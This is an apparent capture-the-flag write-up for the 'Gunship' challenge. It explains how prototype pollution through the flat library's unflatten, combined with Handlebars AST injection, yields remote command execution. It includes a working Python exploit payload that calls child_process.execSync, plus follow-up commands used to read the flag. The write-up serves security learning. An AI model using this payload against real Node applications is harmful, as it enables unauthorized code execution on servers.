# Gunship
This is a beautiful and simple node web application that contains only one user input And vulnerability 
may be at this point.

<p align="center">
<img src="./images/Screenshot.png">
</p>

Inspection of the source code reveals a comment that hints towards the exploit being caused by prototype pollution in unflatten.

> unflatten seems outdated and a bit vulnerable to prototype pollution we sure hope so that po6ix doesn't pwn our puny app with his AST injection on template engines

```js
const path              = require('path');
const express           = require('express');
const handlebars        = require('handlebars');
const { unflatten }     = require('flat');
const router            = express.Router();

router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) => {
	// unflatten seems outdated and a bit vulnerable to prototype pollution
	// we sure hope so that po6ix doesn't pwn our puny app with his AST injection on template engines

    const { artist } = unflatten(req.body);

	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
		return res.json({
			'response': handlebars.compile('Hello {{ user }}, thank you for letting us know!')({ user:'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the full name of an existing member.'
		});
	}
});

module.exports = router;
```
Some google-fu leads us pretty quickly to the following site with a POC by posix on a protype pollution in AST : [AST Injection, Prototype Pollution to RCE](https://blog.p6.is/AST-Injection/#Exploit)

The proof of concept from the site above only required minor changes in order to get command execution. Note that bash is not available inside the docker container, we could use sh instead but as we only need to grab the flag we can just use simple commands.


```python
import requests

URL = '[URL]'

# make pollution
r = requests.post(URL+'/api/submit', json = {
    "artist.name":"Gingell",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`whoami > /app/static/out`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
    })
print(requests.get(URL+'/static/out').text)
```

The command execution is blind, however as we know that the path to the static folder is `/app/static` we can write files into this path and then request them to see the output.

A quick `ls > /app/static/out` and browsing to `/static/out` shows that there is a flag in the current folder.

Changing the command to `cat flag* > /app/static/out` and browsing to `/static/out` again gives us the flag : `HTB{wh3n_l1f3_******_***_**_*****_*********_****_*****}`
